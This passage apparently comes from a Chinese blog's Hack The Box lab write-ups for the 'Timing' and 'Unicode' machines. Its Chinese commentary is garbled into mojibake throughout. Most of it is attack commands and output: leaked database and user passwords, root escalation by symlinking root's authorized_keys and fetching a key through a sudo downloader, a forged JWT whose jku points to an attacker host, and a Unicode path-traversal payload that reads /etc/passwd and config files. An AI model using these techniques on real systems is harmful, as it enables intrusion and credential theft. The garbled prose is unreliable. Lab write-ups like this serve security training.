1740 7æœˆ 20 22:34 profile_update.php drwxr-xr-x 4 root root 4096 12æœˆ 31 17:42 source -rw-r--r-- 1 root root 984 7æœˆ 20 22:34 upload.php â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/backup] â””â”€# cd source â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/backup/source] â””â”€# ls -la æ€»ç”¨é‡ 16 drwxr-xr-x 4 root root 4096 12æœˆ 31 17:42 . drwxr-xr-x 7 root root 4096 12æœˆ 31 17:42 .. drwxr-xr-x 5 root root 4096 12æœˆ 31 17:42 0-e4e214696159a25c69812571c8214d2bf8736a3f drwxr-xr-x 5 root root 4096 12æœˆ 31 17:42 1-16de2698b5b122c93461298eab730d00273bd83e ç„¶åå¤šäº†ä¸¤ä¸ªæ–‡ä»¶å¤¹ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/backup/source] â””â”€# diff 0-e4e214696159a25c69812571c8214d2bf8736a3f/ 1-16de2698b5b122c93461298eab730d00273bd83e/ 1 â¨¯ diff &#39;--color=auto&#39; 0-e4e214696159a25c69812571c8214d2bf8736a3f/commit-meta.txt 1-16de2698b5b122c93461298eab730d00273bd83e/commit-meta.txt 1,3c1,4 &lt; tree fd7fb62599f9702baeb0abdc42a8a4b68e49ec23 &lt; author grumpy &lt;grumpy@localhost.com&gt; 1626820434 +0000 &lt; committer grumpy &lt;grumpy@localhost.com&gt; 1626820434 +0000 --- &gt; tree dcbc181650833009145874df7da85b4c6d84b2ca &gt; parent e4e214696159a25c69812571c8214d2bf8736a3f &gt; author grumpy &lt;grumpy@localhost.com&gt; 1626820453 +0000 &gt; committer grumpy &lt;grumpy@localhost.com&gt; 1626820453 +0000 5c6 &lt; init --- &gt; db_conn updated 0-e4e214696159a25c69812571c8214d2bf8736a3f/css å’Œ 1-16de2698b5b122c93461298eab730d00273bd83e/css æœ‰å…±åŒçš„å­ç›®å½• diff &#39;--color=auto&#39; 0-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php 1-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php 2c2 &lt; $pdo = new PDO(&#39;mysql:host=localhost;dbname=app&#39;, &#39;root&#39;, &#39;S3cr3t_unGu3ss4bl3_p422w0Rd&#39;); --- &gt; $pdo = new PDO(&#39;mysql:host=localhost;dbname=app&#39;, &#39;root&#39;, &#39;4_V3Ry_l0000n9_p422w0rd&#39;); 0-e4e214696159a25c69812571c8214d2bf8736a3f/images å’Œ 1-16de2698b5b122c93461298eab730d00273bd83e/images æœ‰å…±åŒçš„å­ç›®å½• 0-e4e214696159a25c69812571c8214d2bf8736a3f/js å’Œ 1-16de2698b5b122c93461298eab730d00273bd83e/js æœ‰å…±åŒçš„å­ç›®å½• æ•°æ®åº“å‡­è¯å·²è¢«ä¿®æ”¹ä¸ºS3cr3t_unGu3ss4bl3_p422w0Rdï¼Œç°åœ¨æˆ‘ä»¬ä½¿ç”¨sshè¿›è¡Œç™»å½• â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# ssh aaron@10.10.11.135 aaron@10.10.11.135&#39;s password: Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri Dec 31 17:46:35 UTC 2021 System load: 0.0 Processes: 180 Usage of /: 51.5% of 4.85GB Users logged in: 1 Memory usage: 18% IP address for eth0: 10.10.11.135 Swap usage: 0% 8 updates can be applied immediately. 8 of these updates are standard security updates. To see these additional updates run: apt list --upgradable Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Fri Dec 31 17:46:08 2021 from 10.10.14.52 aaron@timing:~$ whoami&amp;&amp;id aaron uid=1000(aaron) gid=1000(aaron) groups=1000(aaron) æˆåŠŸç™»å½•aaronç”¨æˆ· aaron@timing:~$ cat user.txt a3376cc0a8af0e0aa3f66bec0adec1d5 æˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶ æƒé™æå‡aaron@timing:~$ sudo -l Matching Defaults entries for aaron on timing: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User aaron may run the following commands on timing: (ALL) NOPASSWD: /usr/bin/netutils é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹sudoæƒé™ å¯ä»¥ä»¥rootæƒé™æ‰§è¡Œ&#x2F;usr&#x2F;bin&#x2F;netutilsè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç ”ç©¶ç ”ç©¶ aaron@timing:~$ cat /usr/bin/netutils #! /bin/bash java -jar /root/netutils.jar aaron@timing:~$ file /usr/bin/netutils /usr/bin/netutils: Bourne-Again shell script, ASCII text executable é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ç±»å‹ è¿™æ˜¯ä¸€ä¸ªbashè„šæœ¬ï¼ŒåŠŸèƒ½æ˜¯ä»æ ¹ç›®å½•ä¸‹è½½è¿è¡Œä¸€ä¸ªjavaæ–‡ä»¶ï¼Œæ‰§è¡Œä¸€ä¸‹è¯•è¯• aaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input &gt;&gt; æ‰§è¡Œåç»™äº†æˆ‘ä»¬ä¸¤ä¸ªé€‰é¡¹ï¼ŒFTPè¿˜æ˜¯HTTPï¼Œè®¾ç½®ä¸€ä¸ªHTTPç„¶åä¸‹è½½æµ‹è¯•æ–‡ä»¶çœ‹çœ‹æŠŠ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# python3 -m http.server 80 2 â¨¯ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... aaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input &gt;&gt; 1 Enter Url: 10.10.14.52/test.txt Initializing download: http://10.10.14.52/test.txt File size: 14 bytes Opening output file test.txt Server unsupported, starting from scratch with one connection. Starting download Downloaded 14 byte in 0 seconds. (0.02 KB/s) netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input &gt;&gt; 2 aaron@timing:~$ ls -la test.txt -rw-r--r-- 1 root root 14 Dec 31 17:58 test.txt æˆåŠŸä»æˆ‘ä»¬æœ¬åœ°ä¸‹è½½äº†è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”æ˜¯rootæƒé™çš„ï¼Œé‚£å°±å¥½åŠäº† æ¥ç€å¯¹rootè´¦æˆ·ä¸‹çš„.sshæ–‡ä»¶åˆ›å»ºä¸€ä¸ªé“¾æ¥ aaron@timing:~$ ln -s /root/.ssh/authorized_keys keys ln: failed to access &#39;keys&#39;: Permission denied aaron@timing:~$ ls -la total 52 drwxr-x--x 5 aaron aaron 4096 Dec 31 18:06 . drwxr-xr-x 3 root root 4096 Dec 2 09:55 .. lrwxrwxrwx 1 root root 9 Oct 5 15:33 .bash_history -&gt; /dev/null -rw-r--r-- 1 aaron aaron 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 aaron aaron 3771 Apr 4 2018 .bashrc drwx------ 2 aaron aaron 4096 Nov 29 01:34 .cache drwx------ 3 aaron aaron 4096 Nov 29 01:34 .gnupg lrwxrwxrwx 1 aaron aaron 26 Dec 31 18:06 keys -&gt; /root/.ssh/authorized_keys drwxrwxr-x 3 aaron aaron 4096 Nov 29 01:34 .local lrwxrwxrwx 1 aaron aaron 11 Dec 31 17:54 passwd -&gt; /etc/passwd lrwxrwxrwx 1 aaron aaron 11 Dec 31 18:02 passwd.0 -&gt; /etc/passwd -rw-r--r-- 1 root root 1735 Dec 31 17:57 passwd.1 lrwxrwxrwx 1 aaron aaron 11 Dec 31 17:57 passwd.2 -&gt; /etc/passwd -rw-r--r-- 1 root root 1735 Dec 31 17:57 passwd.3 -rw-r--r-- 1 root root 1735 Dec 31 18:03 passwd.4 -rw-r--r-- 1 aaron aaron 807 Apr 4 2018 .profile -rw-r--r-- 1 root root 14 Dec 31 17:58 test.txt -rw-r----- 1 root aaron 33 Dec 31 17:51 user.txt lrwxrwxrwx 1 root root 9 Oct 5 15:33 .viminfo -&gt; /dev/null æ¥ç€åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªsshçš„å¯†é’¥ï¼Œç„¶åå¤åˆ¶åˆ°æ¡Œé¢ï¼Œæ”¹åä¸ºkeys â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa Your public key has been saved in /root/.ssh/id_rsa.pub The key fingerprint is: SHA256:M12TnW2ZwayF1exH6fYv+fqbplhkdyxg/9oFI+yu7os root@root The key&#39;s randomart image is: +---[RSA 3072]----+ | =+o| | + BB| | * *=o| | . + = =o| | S . oo*.=| | o .o..=o| | .. .+| | . .o o++| | Eo=+..=B=| +----[SHA256]-----+ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# ls -la /root/.ssh æ€»ç”¨é‡ 20 drwx------ 2 root root 4096 1æœˆ 1 12:56 . drwx------ 28 root root 4096 1æœˆ 1 12:56 .. -rw------- 1 root root 2590 1æœˆ 1 12:56 id_rsa -rw-r--r-- 1 root root 563 1æœˆ 1 12:56 id_rsa.pub -rw-r--r-- 1 root root 3772 12æœˆ 31 17:45 known_hosts â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# cp /root/.ssh/id_rsa.pub keys â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# ls keys â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... æ¥ç€ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡ aaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input &gt;&gt; 1 Enter Url: http://10.10.14.52/keys Initializing download: http://10.10.14.52/keys File size: 563 bytes Opening output file keys Server unsupported, starting from scratch with one connection. Starting download Downloaded 563 byte in 0 seconds. (0.91 KB/s) netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input &gt;&gt; 2 æ¥ç€ä½¿ç”¨&#x2F;usr&#x2F;bin&#x2F;netutilsæ¥ä¸‹è½½keys ç„¶åä½¿ç”¨ssh -iè¿›è¡Œè¿æ¥ç™»å½• â”Œâ”€â”€(rootğŸ’€root)-[~/.ssh] â””â”€# ssh -i id_rsa root@10.10.11.135 Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat Jan 1 13:29:39 UTC 2022 System load: 0.0 Processes: 202 Usage of /: 48.7% of 4.85GB Users logged in: 1 Memory usage: 10% IP address for eth0: 10.10.11.135 Swap usage: 0% 8 updates can be applied immediately. 8 of these updates are standard security updates. To see these additional updates run: apt list --upgradable Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Dec 7 12:08:29 2021 root@timing:~# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸæ‹¿åˆ°rootæƒé™ root@timing:~# ls axel netutils.jar root.txt root@timing:~# cat root.txt c9e18f123e0e2012bbf16a0f64bc3715 æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Unicode - Hackthebox","slug":"Hackthebox - Unicode","date":"2021-12-16T11:38:36.000Z","updated":"2023-05-20T03:19:22.000Z","comments":true,"path":"2021/12/16/Hackthebox - Unicode/","link":"","permalink":"http://www.lucifiel.com/2021/12/16/Hackthebox%20-%20Unicode/","excerpt":"","text":"Hackthebox - Unicodeé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.126 Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-04 01:22 EST Nmap scan report for 10.10.11.126 Host is up (0.22s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA) | 256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA) |_ 256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-generator: Hugo 0.83.1 |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Hackmedia No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=12/4%OT=22%CT=1%CU=41014%PV=Y%DS=2%DC=T%G=Y%TM=61AB094 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=C)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 53/tcp) HOP RTT ADDRESS 1 217.74 ms 10.10.14.1 2 217.99 ms 10.10.11.126 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.13 seconds è¿™é‡Œåªæ‰«æåˆ°22å’Œ80ç«¯å£ï¼Œå»80ç«¯å£çœ‹ä¸€ä¸‹httpæœåŠ¡å†…å®¹ è¿™å¥½åƒæ˜¯ä¸€ä¸ªå¨èƒæƒ…æŠ¥å…¬å¸çš„å®˜ç½‘ï¼Œè€è§„çŸ©ï¼Œä¸€è¾¹æ‰«æç›®å½•ï¼Œä¸€è¾¹çœ‹ç½‘ç«™ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.11.126/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 9294 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.126/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 9294 ________________________________________________ . [Status: 200, Size: 2078, Words: 363, Lines: 69] :: Progress: [43003/43003] :: Job [1/1] :: 155 req/sec :: Duration: [0:04:48] :: Errors: 0 :: åŠ äº†è¿‡æ»¤åæ²¡æ‰«å‡ºæ¥ä¸œè¥¿ï¼Œåªèƒ½å»ä¸€ä¸ªä¸ªåŠŸèƒ½æ£€æŸ¥äº† éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·å»è¯•è¯•èƒ½ä¸èƒ½ç™»å½• ç™»å½•åçš„é¡µé¢ï¼Œåˆ°å¤„çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ç‚¹å§ çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ è¯•è¯•å§ ä¼ æ˜¯å¯ä»¥ä¼ çš„ï¼Œä½†æ˜¯æ„Ÿè§‰æ— æ³•æ‰§è¡Œå’Œä¸çŸ¥é“ä¸Šä¼ åçš„åœ°å€ï¼Œæ”¾å¼ƒï¼Œçœ‹çœ‹å…¶ä»–æ€è·¯ æŸ¥çœ‹äº†ä¸€ä¸‹cookieï¼Œè«åè§‰å¾—çœ¼ç†Ÿï¼Œè¿™ä¸æ˜¯JWTå— å¤åˆ¶åˆ°JWT.IOå»çœ‹çœ‹ https://jwt.io/ è·å¾—äº†ä¸€ä¸ªæ–°çš„URL http://hackmedia.htb/static/jwks.json æˆ‘ä»¬æŠŠè¿™ä¸ªé¡µé¢æ·»åŠ åˆ°hostsé‡Œ echo 10.10.11.126 hackmedia.htb &gt;&gt; /etc/hosts ç„¶åå†å»è®¿é—®è¿™ä¸ªURL å°†è·å–åˆ°çš„jsonä¿å­˜åˆ°æœ¬åœ° curl http://hackmedia.htb/static/jwks.json &gt; jwks.json https://hackernoon.com/json-web-tokens-jwt-demystified-f7e202249640 https://openid.net/specs/draft-jones-json-web-key-03.html#Acknowledgements æ‰¾åˆ°ä¸¤ç¯‡jwtç›¸å…³çš„æ–‡ç« ï¼Œå¤§å®¶æœ‰å…´è¶£çš„è‡ªå·±çœ‹ä¸€ä¸‹å§ï¼Œæˆ‘å°±ä¸è¯¦ç»†è®²è§£äº† https://mkjwk.org/ ä½¿ç”¨åœ¨çº¿å·¥å…·ç”Ÿæˆä¸€ä¸ªjwtçš„key ç„¶åä½¿ç”¨æˆ‘ä»¬ç”Ÿæˆå‡ºæ¥çš„jsoné‡Œçš„nå€¼ï¼Œæ›¿æ¢æ‰æˆ‘ä»¬ä¿å­˜çš„jsoné‡Œçš„nå€¼ æ¼æ´åˆ©ç”¨ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ç”¨adminæ›¿æ¢æ‰æˆ‘ä»¬çš„ç”¨æˆ·åï¼Œç„¶åå°†æ–°ç”Ÿæˆçš„keyå¡«å…¥åç”Ÿæˆæ–°çš„JWTä»¤ç‰Œ { &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;RS256&quot;, &quot;jku&quot;: &quot;http://hackmedia.htb/static/../redirect?url=10.10.14.14/jwks.json&quot; } eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuMTQvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.BKe3g8gh_oyrQIjTOgSh4AqIKTHI79jQQhSG1t-jVxx0pvXL0yCAJi0gXvKpNSbKG_cVpzXlVT4e_mNmfF1-IqoneHTmkhEAMFR0ZT4AeVykvDFTlqaKJj2mgjTcXZ_S8odcWAQNRuzondUaOjRT9wr-_CrPm5xkbUwX_mu3p2jM1AWFISba8XM6bcnIBalRb398-7KJIveBaOhqmjEVdV4voFaBBMU7vS8yS4hhhzgE6NdvxiHPIeSFUYGpD9HcZXPmIgNAY1UmJjwMrF0n1N_MFGB_7oCK5KlTq4IIx4qRGQ8_JhAw8haQbC1jwC6A3zlHzqMVSfoafd6BdtYZ4A http://hackmedia.htb/login/ å¾—åˆ°äº†æˆ‘ä»¬çš„æ–°çš„ä»¤ç‰Œï¼Œç„¶åå»æ›¿æ¢æ‰ä»¤ç‰Œ æ›¿æ¢æ‰ä»¥ååˆ·æ–°é¡µé¢ æˆåŠŸè¿›å…¥åå° ç‚¹å‡»è¿™ä¿©éšä¾¿ä¸€ä¸ªï¼Œä¼šè·³è½¬åˆ°å¯¹åº”çš„pdfæ–‡ä»¶ï¼Œè¿™é‡Œç»è¿‡å„ç§æµ‹è¯•ï¼Œç„¶åä¸æœ‹å‹æ²Ÿé€šåï¼Œå‘ç°å¯èƒ½æ˜¯ç”±äºæµè§ˆå™¨æœºåˆ¶çš„åŸå› ï¼Œå¯¼è‡´ä½¿ç”¨Firefoxä¼šæœ‰ç‚¹é—®é¢˜ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘æ¢æˆäº†Chromeæ¥æ‰§è¡Œ çœ‹ç€è¿™ä¸ªç»“æ„ï¼Œæˆ‘æ„Ÿè§‰æœ‰æœ¬åœ°æ–‡ä»¶è¯»å–çš„æ¼æ´ï¼Œæµ‹ä¸€ä¸‹ è¿™é‡Œ404äº†ï¼Œä½†æ˜¯å´æç¤ºäº†æˆ‘ä»¬æœ‰è¿‡æ»¤ï¼Œå¹¶ä¸”è¯´æˆ‘ä»¬æ°¸è¿œä¹Ÿè¿‡ä¸å»è¿™ä¸ªè¿‡æ»¤ï¼Ÿ è¿™æˆ‘å°±ä¸æœäº†ï¼Œä¸å°±unicodeå—ï¼Œç»•ä»–ä¸«çš„ https://lazarv.com/posts/unicode-normalization-vulnerabilities/ çœ‹æ ·å­è¿‡æ»¤æ˜¯ç»•è¿‡å»äº†ï¼Œä½†æ˜¯æ²¡è®¿é—®åˆ°æ–‡ä»¶ï¼Œé‚£å°±å±‚æ•°ä¸å¤Ÿå˜›ï¼Œå†å¤šåŠ å‡ å±‚å°±å¥½äº† http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd è¿™ä¸å°±è¯»å–åˆ°äº†å— root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false code:x:1000:1000:,,,:/home/code:/bin/bash è¿™é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ªmysqlçš„æƒé™ç»„ï¼Œå»è¯»å–mysqlçš„å¯†ç ï¼Œä½†ä¸çŸ¥é“mysqlè·¯å¾„åœ¨å“ª æˆ‘ä»¬çŸ¥é“nginxåœ¨è¿™å°é¶æœºä¸Šè¿è¡Œç€å‘¢ï¼Œè¯•ç€å»è¯»å–ä¸€ä¸‹nginxçš„é…ç½®æ–‡ä»¶ http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/nginx/sites-available/default http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/home/code/coder/db.yaml æˆ‘ä»¬åœ¨nginxçš„é…ç½®æ–‡ä»¶é‡Œå¾—åˆ°äº†ä¸€ä¸ªè·¯å¾„ å¾—åˆ°äº†codeçš„ç”¨æˆ·å¯†ç ï¼Œç„¶ååœ¨passwdé‡Œæˆ‘ä¼¼ä¹çœ‹åˆ°codeç”¨æˆ·æœ‰sshæƒé™ï¼Œå»å°è¯•ä¸€ä¸‹ username = code password = B3stC0d3r2021@@! code@code:~$ whoami&amp;&amp;id code uid=1000(code) gid=1000(code) groups=1000(code) OKï¼Œæ‹¿åˆ°useræƒé™çš„shelläº† code@code:~$ ls coder user.txt code@code:~$ cat user.txt 280ae5b99ba2b4de934bbd3b7f0fb0fd æ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶ æƒé™æå‡code@code:~$ sudo -l Matching Defaults entries for code on code: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User code may run the following commands on code: (root) NOPASSWD: /usr/bin/treport sudo -lçœ‹åˆ°æœ‰ä¸€ä¸ªå¯ä»¥å…å¯†ç rootæƒé™æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ‰§è¡Œä¸€ä¸‹çœ‹çœ‹ä»€ä¹ˆæ•ˆæœ code@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice: å¥½åƒæ˜¯ä¸ªå¨èƒæŠ¥å‘Šç”Ÿæˆçš„ï¼Ÿ å…ˆæ­£å¸¸ä½¿ç”¨ä¸€ä¸‹åŠŸèƒ½çœ‹çœ‹ code@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:1 Enter the filename:lucifiel Enter the report:lucifiel Enter your choice:2 ALL THE THREAT REPORTS: lucifiel Enter the filename:3 SOMETHING IS WRONG Enter your choice:3 Enter the IP/file_name:lucifiel % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0curl: (6) Could not resolve host: lucifiel Enter your choice:lucifiel||whoami Wrong Input code@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:4 code@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:^CTraceback (most recent call last): File &quot;treport.py&quot;, line 79, in &lt;module&gt; File &quot;treport.py&quot;, line 43, in download KeyboardInterrupt [1431] Failed to execute script &#39;treport&#39; due to unhandled exception! éšä¾¿ä½¿ç”¨äº†äº†ä¸€ä¸‹åŠŸèƒ½ï¼Œå‘ç°ä¸‹è½½åŠŸèƒ½ä¼¼ä¹æ˜¯ä½¿ç”¨äº†curlè¿›è¡Œè¯»å–ï¼Œå¹¶ä¸”è°ƒç”¨äº†pythonæ–‡ä»¶ï¼Œè¿™é‡Œä½¿ç”¨å·¥å…·ç»™æå–å‡ºpythonè„šæœ¬çœ‹ä¸€ä¸‹ https://github.com/LucifielHack/pyinstxtractor é¦–å…ˆä½¿ç”¨scpå°†äºŒè¿›åˆ¶æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pyinstxtractor] â””â”€# scp code@10.10.11.126:/usr/bin/treport ./ code@10.10.11.126&#39;s password: treport â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pyinstxtractor] â””â”€# python3 pyinstxtractor.py treport [+] Processing treport [+] Pyinstaller 